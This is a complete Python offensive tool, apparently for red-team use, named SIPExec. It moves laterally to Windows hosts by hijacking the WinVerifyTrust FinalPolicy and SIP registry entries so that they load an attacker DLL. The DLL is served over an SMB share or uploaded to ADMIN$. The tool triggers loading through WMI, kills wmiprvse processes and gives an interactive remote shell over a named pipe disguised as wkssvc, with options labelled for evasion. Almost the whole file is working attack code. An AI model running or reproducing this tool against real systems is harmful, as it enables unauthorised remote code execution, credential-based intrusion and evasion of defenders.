#!/usr/bin/env python3
"""
SIPExec — Lateral movement via WinVerifyTrust FinalPolicy hijack.

Two modes:
  serve (default): UNC-hosted DLL, file-based I/O, NETWORK SERVICE context
  upload (-upload): Uploaded DLL, named pipe impersonation, admin context

Usage:
  sipexec.py 'admin:pass@target' whoami
  sipexec.py -upload 'admin:pass@target' whoami
  sipexec.py -upload 'admin:pass@target'   # interactive shell
"""
from __future__ import annotations

import argparse
import cmd
import logging
import os
import shutil
import socket
import sys
import tempfile
import threading
import time
import uuid

from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.krb5.keytab import Keytab
from impacket.smbconnection import SMBConnection
from impacket.smbserver import SimpleSMBServer

HKLM = 0x80000002
FP_GUID_DEFAULT = "{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}"
FP_GUID_DRIVER = "{573E31F8-AABA-11D0-8CCB-00C04FC295EE}"
FP_GUID_HTTPS = "{FC451C16-AC75-11D1-B4B8-00C04FB66EA0}"
FP_KEY_TMPL = "SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{guid}"
SIP_KEY = "SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}"
PIPE_DONE_MARKER = b"\n[DONE]\n"
CODEC = sys.stdout.encoding or "utf-8"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DLL = os.path.join(SCRIPT_DIR, "sipexec_payload_impersonate.dll")


def _derive_pipe_name(remote_dll_path):
    """FNV-1a pipe name from DLL basename."""
    basename = remote_dll_path.rsplit("\\", 1)[-1].lower()
    h = 2166136261
    for ch in basename.encode("ascii", errors="ignore"):
        h ^= ch
        h = (h * 16777619) & 0xFFFFFFFF
    return f"wkssvc_{h:08x}"


class _HostingSMBServer(threading.Thread):
    def __init__(self, share_path, listen_address="0.0.0.0", listen_port=445):
        super().__init__(daemon=True)
        self.share_path = share_path
        self.listen_address = listen_address
        self.listen_port = listen_port
        self.server = None
        self.error = None

    def run(self):
        try:
            smb_logger = logging.getLogger("impacket.smbserver")
            smb_logger.setLevel(logging.CRITICAL)
            smb_logger.propagate = False
            self.server = SimpleSMBServer(listenAddress=self.listen_address, listenPort=self.listen_port)
            self.server.setSMB2Support(True)
            self.server.addShare("SHARE", self.share_path, readOnly="no")
            srv = self.server.getServer()
            srv.daemon_threads = True
            srv.block_on_close = False
            self.server.start()
        except Exception as exc:
            self.error = exc

    def stop(self):
        if not self.server:
            return
        try:
            self.server.getServer()._BaseServer__shutdown_request = True
            self.server.stop()
        except Exception:
            pass


class SIPEXEC:
    def __init__(self, command="", username="", password="", domain="", hashes=None,
                 aesKey=None, doKerberos=False, kdcHost=None, dllPath=None,
                 noOutput=False, upload=False, listenAddress=None,
                 sigHijack=False, guid="default", noKill=False, timeout=15,
                 shell="cmd"):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__dllPath = dllPath
        self.__noOutput = noOutput
        self.__upload = upload
        self.__listenAddress = listenAddress
        self.__sigHijack = sigHijack
        self.__noKill = noKill
        self.__timeout = timeout
        self.__shell = shell
        self.__origDll = "WINTRUST.DLL"
        self.__origSipDll = "WINTRUST.DLL"
        self.__origSipFunc = "CryptSIPVerifyIndirectData"
        self.__smbConnection = None
        self.__pipeTid = None
        self.__pipeFid = None
        self.__smbServer = None
        self.__uploaded = False
        self.__remoteDllPath = None
        self.__pipeName = None
        self.__shareDir = None
        self.__dllName = None
        self.__registryRestored = False
        self.shell = None

        if guid == "driver":
            self.__fpGuid = FP_GUID_DRIVER
        elif guid == "https":
            self.__fpGuid = FP_GUID_HTTPS
        else:
            self.__fpGuid = FP_GUID_DEFAULT
        self.__fpKey = FP_KEY_TMPL.replace("{guid}", self.__fpGuid)

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(":")

        self.__dcomDefault = self.__wmiDefault = None
        self.__dcomCimv2 = self.__wmiCimv2 = None

    def __newDCOM(self, addr):
        import socket as _sock
        old = _sock.getdefaulttimeout()
        _sock.setdefaulttimeout(self.__timeout)
        try:
            return DCOMConnection(addr, self.__username, self.__password, self.__domain,
                                  self.__lmhash, self.__nthash, self.__aesKey,
                                  doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        finally:
            _sock.setdefaulttimeout(old)

    def __initDCOM(self, addr):
        """Parallel DCOM init for root/default + root/cimv2."""
        errors = [None, None]

        def _init(attr_dcom, attr_wmi, ns, idx):
            try:
                dcom = self.__newDCOM(addr)
                iI = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
                iL = wmi.IWbemLevel1Login(iI)
                svc = iL.NTLMLogin(ns, NULL, NULL)
                iL.RemRelease()
                setattr(self, attr_dcom, dcom)
                setattr(self, attr_wmi, svc)
            except Exception as e:
                errors[idx] = e

        t1 = threading.Thread(target=_init, daemon=True,
                              args=("_SIPEXEC__dcomDefault", "_SIPEXEC__wmiDefault", "//./root/default", 0))
        t2 = threading.Thread(target=_init, daemon=True,
                              args=("_SIPEXEC__dcomCimv2", "_SIPEXEC__wmiCimv2", "//./root/cimv2", 1))
        t1.start()
        t2.start()
        deadline = time.time() + self.__timeout
        t1.join(timeout=max(0.1, deadline - time.time()))
        t2.join(timeout=max(0.1, deadline - time.time()))
        for t in (t1, t2):
            if t.is_alive():
                raise TimeoutError(f"Connection timed out after {self.__timeout}s")
        for e in errors:
            if e:
                raise e

    def run(self, addr):
        try:
            if self.__upload:
                self.__initParallel(addr)
            else:
                self.__initDCOM(addr)
                self.__stage(addr)
                # Serve mode needs SMB connection for pipe I/O
                self.__smbConnection = SMBConnection(addr, addr, timeout=self.__timeout)
                if not self.__doKerberos:
                    self.__smbConnection.login(self.__username, self.__password, self.__domain,
                                               self.__lmhash, self.__nthash)
                else:
                    self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain,
                                                       self.__lmhash, self.__nthash, self.__aesKey,
                                                       kdcHost=self.__kdcHost)
            self.__hijack()
            self.__triggerCached()

            # Unified pipe I/O — both modes use impersonation DLL
            success = self.__connectPipe(timeout=3)
            if not success and not self.__noKill:
                logging.info("Warm target — killing providers and retrying...")
                self.__killWmiprvse()
                self.__triggerFresh(addr)
                success = self.__connectPipe(timeout=self.__timeout)
            if not success:
                logging.error("Could not connect to pipe.")
                return
            if self.__command:
                self.shell = RemoteShell(self.__smbConnection, self.__pipeTid, self.__pipeFid, self.__shell)
                self.shell.onecmd(self.__command)
            else:
                self.shell = RemoteShell(self.__smbConnection, self.__pipeTid, self.__pipeFid, self.__shell)
                self.shell.cmdloop()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            if str(e):
                logging.error(str(e))
        finally:
            self.__cleanup(addr)

    def __initParallel(self, addr):
        """DCOM + upload in parallel threads. Reuse upload SMB for pipe."""
        errors = [None, None, None]

        def _init_default():
            try:
                d = self.__newDCOM(addr)
                iI = d.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
                iL = wmi.IWbemLevel1Login(iI)
                self.__wmiDefault = iL.NTLMLogin("//./root/default", NULL, NULL)
                iL.RemRelease()
                self.__dcomDefault = d
            except Exception as e:
                errors[0] = e

        def _init_cimv2():
            try:
                d = self.__newDCOM(addr)
                iI = d.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
                iL = wmi.IWbemLevel1Login(iI)
                self.__wmiCimv2 = iL.NTLMLogin("//./root/cimv2", NULL, NULL)
                iL.RemRelease()
                self.__dcomCimv2 = d
            except Exception as e:
                errors[1] = e

        def _upload():
            try:
                payload = PAYLOAD_DLL
                if not os.path.exists(payload):
                    errors[2] = FileNotFoundError(f"DLL not found: {payload}")
                    return
                self.__smbConnection = SMBConnection(addr, addr, timeout=self.__timeout)
                if not self.__doKerberos:
                    self.__smbConnection.login(self.__username, self.__password, self.__domain,
                                               self.__lmhash, self.__nthash)
                else:
                    self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain,
                                                       self.__lmhash, self.__nthash, self.__aesKey,
                                                       kdcHost=self.__kdcHost)
                self.__dllName = uuid.uuid4().hex[:8] + ".dll"
                with open(payload, "rb") as f:
                    dll_data = f.read()
                sent = [False]
                self.__smbConnection.putFile("ADMIN$", f"Temp\\{self.__dllName}",
                                             lambda _: b"" if sent[0] else (sent.__setitem__(0, True) or dll_data))
                self.__remoteDllPath = f"C:\\Windows\\Temp\\{self.__dllName}"
                self.__uploaded = True
                self.__pipeName = _derive_pipe_name(self.__remoteDllPath)
            except Exception as e:
                errors[2] = e

        threads = [threading.Thread(target=f, daemon=True) for f in (_init_default, _init_cimv2, _upload)]
        for t in threads:
            t.start()
        deadline = time.time() + self.__timeout
        for t in threads:
            t.join(timeout=max(0.1, deadline - time.time()))
        for t in threads:
            if t.is_alive():
                raise TimeoutError(f"Connection timed out after {self.__timeout}s")
        for e in errors:
            if e:
                raise e

    def __stage(self, addr):
        if self.__dllPath:
            self.__remoteDllPath = self.__dllPath
            self.__pipeName = _derive_pipe_name(self.__remoteDllPath)
            return

        payload = PAYLOAD_DLL
        if not os.path.exists(payload):
            raise FileNotFoundError(f"DLL not found: {payload}")
        self.__shareDir = tempfile.mkdtemp(prefix="sipexec_")
        self.__dllName = uuid.uuid4().hex[:8] + ".dll"
        shutil.copy2(payload, os.path.join(self.__shareDir, self.__dllName))
        self.__smbServer = _HostingSMBServer(self.__shareDir, self.__listenAddress or "0.0.0.0")
        self.__smbServer.start()
        time.sleep(0.3)
        if self.__smbServer.error:
            raise self.__smbServer.error
        local_ip = self.__listenAddress or self.__getLocalIP(addr)
        self.__remoteDllPath = f"\\\\{local_ip}\\SHARE\\{self.__dllName}"
        self.__pipeName = _derive_pipe_name(self.__remoteDllPath)
        logging.info(f"Serving via UNC: {self.__remoteDllPath}")

    def __getLocalIP(self, target):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, 445))
            return s.getsockname()[0]
        finally:
            s.close()

    def __hijack(self):
        stdreg, _ = self.__wmiDefault.GetObject("StdRegProv")
        if self.__sigHijack:
            self.__origSipDll = stdreg.GetStringValue(HKLM, SIP_KEY, "Dll").sValue or "WINTRUST.DLL"
            self.__origSipFunc = stdreg.GetStringValue(HKLM, SIP_KEY, "FuncName").sValue or "CryptSIPVerifyIndirectData"
            stdreg.SetStringValue(HKLM, SIP_KEY, "Dll", "C:\\Windows\\System32\\ntdll.dll")
            stdreg.SetStringValue(HKLM, SIP_KEY, "FuncName", "DbgUiContinue")
        stdreg.SetStringValue(HKLM, self.__fpKey, "$DLL", self.__remoteDllPath)
        logging.debug(f"FinalPolicy → {self.__remoteDllPath}")

    def __killWmiprvse(self):
        if not self.__wmiCimv2:
            return
        try:
            result = self.__wmiCimv2.ExecQuery('SELECT ProcessId FROM Win32_Process WHERE Name="wmiprvse.exe"')
            try:
                while True:
                    pid = result.Next(0xFFFFFFFF, 1)[0].ProcessId
                    try:
                        proc, _ = self.__wmiCimv2.GetObject(f'Win32_Process.Handle="{pid}"')
                        proc.Terminate(1)
                    except Exception:
                        pass
            except Exception:
                pass
        except Exception:
            pass
        try:
            self.__wmiCimv2.RemRelease()
        except Exception:
            pass
        try:
            self.__dcomCimv2.disconnect()
        except Exception:
            pass
        self.__wmiCimv2 = self.__dcomCimv2 = None

    def __triggerCached(self):
        if not self.__wmiCimv2:
            return
        def _fire():
            try:
                self.__wmiCimv2.ExecQuery('SELECT * FROM Win32_PnPSignedDriver WHERE DeviceName="null"')
            except Exception:
                pass
        threading.Thread(target=_fire, daemon=True).start()

    def __triggerFresh(self, addr):
        dcom = self.__newDCOM(addr)
        iI = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        iL = wmi.IWbemLevel1Login(iI)
        svc = iL.NTLMLogin("//./root/cimv2", NULL, NULL)
        iL.RemRelease()
        def _fire():
            try:
                svc.ExecQuery('SELECT * FROM Win32_PnPSignedDriver WHERE DeviceName="null"')
            except Exception:
                pass
            finally:
                try:
                    svc.RemRelease()
                except Exception:
                    pass
                try:
                    dcom.disconnect()
                except Exception:
                    pass
        threading.Thread(target=_fire, daemon=True).start()

    def __connectPipe(self, timeout=None):
        if not self.__smbConnection:
            return False
        timeout = timeout or self.__timeout
        self.__pipeTid = self.__smbConnection.connectTree("IPC$")
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                self.__pipeFid = self.__smbConnection.openFile(self.__pipeTid, self.__pipeName)
                time.sleep(0.05)
                self.__smbConnection.readNamedPipe(self.__pipeTid, self.__pipeFid, 4096)
                return True
            except Exception:
                time.sleep(0.1)
        return False

    def __restore(self):
        if self.__registryRestored or not self.__wmiDefault:
            return
        try:
            stdreg, _ = self.__wmiDefault.GetObject("StdRegProv")
            stdreg.SetStringValue(HKLM, self.__fpKey, "$DLL", self.__origDll)
            if self.__sigHijack:
                stdreg.SetStringValue(HKLM, SIP_KEY, "Dll", self.__origSipDll)
                stdreg.SetStringValue(HKLM, SIP_KEY, "FuncName", self.__origSipFunc)
            self.__registryRestored = True
        except Exception as e:
            logging.debug(f"Registry restore failed: {e}")

    def __cleanup(self, addr):
        if self.__pipeFid:
            try:
                self.__smbConnection.writeNamedPipe(self.__pipeTid, self.__pipeFid, b"exit")
            except Exception:
                pass
            try:
                self.__smbConnection.closeFile(self.__pipeTid, self.__pipeFid)
            except Exception:
                pass
        if self.__smbConnection:
            try:
                self.__smbConnection.logoff()
            except Exception:
                pass

        # Kill wmiprvse in parallel with restore (clears FinalPolicy cache for next run)
        def _kill_cleanup():
            try:
                dcom = self.__newDCOM(addr)
                iI = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
                iL = wmi.IWbemLevel1Login(iI)
                svc = iL.NTLMLogin("//./root/cimv2", NULL, NULL)
                iL.RemRelease()
                result = svc.ExecQuery('SELECT ProcessId FROM Win32_Process WHERE Name="wmiprvse.exe"')
                try:
                    while True:
                        pid = result.Next(0xFFFFFFFF, 1)[0].ProcessId
                        try:
                            proc, _ = svc.GetObject(f'Win32_Process.Handle="{pid}"')
                            proc.Terminate(1)
                        except Exception:
                            pass
                except Exception:
                    pass
                try:
                    dcom.disconnect()
                except Exception:
                    pass
            except Exception:
                pass
        kill_thread = threading.Thread(target=_kill_cleanup, daemon=True)
        kill_thread.start()
        self.__restore()
        kill_thread.join(timeout=3)

        if self.__uploaded and self.__dllName:
            try:
                conn = SMBConnection(addr, addr)
                if not self.__doKerberos:
                    conn.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    conn.kerberosLogin(self.__username, self.__password, self.__domain,
                                       self.__lmhash, self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
                conn.deleteFile("ADMIN$", f"Temp\\{self.__dllName}")
                conn.logoff()
            except Exception:
                pass

        for dcom in (self.__dcomDefault, self.__dcomCimv2):
            if dcom:
                try:
                    dcom.disconnect()
                except Exception:
                    pass

        if self.__smbServer:
            self.__smbServer.stop()
            time.sleep(0.2)
        if self.__shareDir and os.path.exists(self.__shareDir):
            shutil.rmtree(self.__shareDir, ignore_errors=True)

        # Suppress DCOM listener thread timeout noise on exit
        logging.getLogger("impacket").setLevel(logging.CRITICAL)
        import threading as _th
        _orig_hook = _th.excepthook
        _th.excepthook = lambda args: None if isinstance(args.exc_value, (TimeoutError, OSError)) else _orig_hook(args)


class RemoteShell(cmd.Cmd):
    def __init__(self, smbConnection, tid, fid, shell="cmd"):
        super().__init__()
        self.__smbConnection = smbConnection
        self.__tid = tid
        self.__fid = fid
        self.__outputBuffer = ""
        self.__shell = shell
        self.__pwd = "C:\\"
        self.intro = "[*] Connected. Type commands or 'exit' to disconnect."
        self.prompt = "C:\\> "

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print(" lcd {path}  - change local directory")
        print(" exit        - disconnect")
        print(" ! {cmd}     - local shell command")

    def do_lcd(self, s):
        if not s:
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_exit(self, s):
        return True

    def do_EOF(self, s):
        print()
        return True

    def emptyline(self):
        return False

    def default(self, line):
        if line:
            self.execute_remote(line)
            if self.__outputBuffer:
                print(self.__outputBuffer)
                self.__outputBuffer = ""

    def execute_remote(self, data):
        if self.__shell == "powershell":
            wrapped = f"powershell.exe -nop -w hidden -c \"Set-Location '{self.__pwd}'; {data}; (Get-Location).Path\""
        else:
            wrapped = f"cd /d {self.__pwd} && {data} & cd"

        try:
            self.__smbConnection.writeNamedPipe(self.__tid, self.__fid, wrapped.encode("utf-8"))
        except Exception as e:
            logging.error(f"Send error: {e}")
            return
        output = b""
        while True:
            try:
                chunk = self.__smbConnection.readNamedPipe(self.__tid, self.__fid, 65536)
                output += chunk
                if b"DONE" in output:
                    break
            except Exception:
                break
        text = output.decode(CODEC, errors="replace")
        if "DONE" in text:
            text = text[:text.index("DONE")].rstrip("\n[")
        text = text.rstrip("\r\n")

        # Last line is the current directory from `cd` / `Get-Location`
        lines = text.split("\n")
        if lines:
            last = lines[-1].strip()
            if last and len(last) >= 3 and last[1:3] == ":\\":
                self.__pwd = last
                self.prompt = f"{self.__pwd}> "
                text = "\n".join(lines[:-1]).rstrip("\r\n")

        self.__outputBuffer = text


if __name__ == "__main__":
    print("SIPExec — Trust Provider lateral movement")
    print("Parallel DCOM · Serve/Upload · Admin impersonation\n")

    parser = argparse.ArgumentParser(description="Lateral movement via WinVerifyTrust FinalPolicy hijack.")
    parser.add_argument("target", help="[[domain/]username[:password]@]<target>")
    parser.add_argument("command", nargs="*", default=" ", help="Command to execute (omit for interactive shell)")
    parser.add_argument("-ts", action="store_true", help="Timestamps in logging")
    parser.add_argument("-debug", action="store_true", help="Debug output")
    parser.add_argument("-codec", help=f"Output encoding (default: {CODEC})")
    parser.add_argument("-nooutput", action="store_true", help="Fire and forget")

    delivery = parser.add_argument_group("payload delivery")
    delivery.add_argument("-upload", action="store_true", help="Upload DLL (admin context via pipe impersonation)")
    delivery.add_argument("-shell", choices=["cmd", "powershell"], default="cmd",
                          help="Shell to use for command execution (default: cmd)")
    delivery.add_argument("-listen", metavar="ip", help="IP to bind SMB server on (serve mode)")
    delivery.add_argument("-dll", metavar="path", help="Use this DLL path directly (skip staging)")

    evasion = parser.add_argument_group("evasion")
    evasion.add_argument("-guid", choices=["default", "driver", "https"], default="default", help="Trust provider GUID")
    evasion.add_argument("-sig-hijack", action="store_true", help="Also hijack SIP")
    evasion.add_argument("-no-kill", action="store_true", help="Skip wmiprvse reset")
    evasion.add_argument("-timeout", type=int, default=15, metavar="SEC", help="Timeout (default: 15s)")

    auth = parser.add_argument_group("authentication")
    auth.add_argument("-hashes", metavar="LMHASH:NTHASH")
    auth.add_argument("-no-pass", action="store_true")
    auth.add_argument("-k", action="store_true", help="Kerberos auth")
    auth.add_argument("-aesKey", metavar="hex")
    auth.add_argument("-dc-ip", metavar="ip")
    auth.add_argument("-keytab", metavar="file")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    logger.init(options.ts)
    logging.getLogger().setLevel(logging.DEBUG if options.debug else logging.INFO)
    if options.codec:
        CODEC = options.codec

    domain, username, password, address = parse_target(options.target)
    domain = domain or ""

    if options.keytab:
        Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
        options.k = True
    if options.aesKey:
        options.k = True
    if password == "" and username != "" and options.hashes is None and not options.no_pass and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    command = " ".join(options.command)
    if command == " ":
        command = ""

    executer = SIPEXEC(command, username, password, domain, options.hashes,
                       options.aesKey, options.k, options.dc_ip, options.dll,
                       options.nooutput, options.upload, options.listen,
                       options.sig_hijack, options.guid, options.no_kill,
                       options.timeout, options.shell)
    try:
        executer.run(address)
    except Exception as e:
        if options.debug:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
        sys.exit(1)
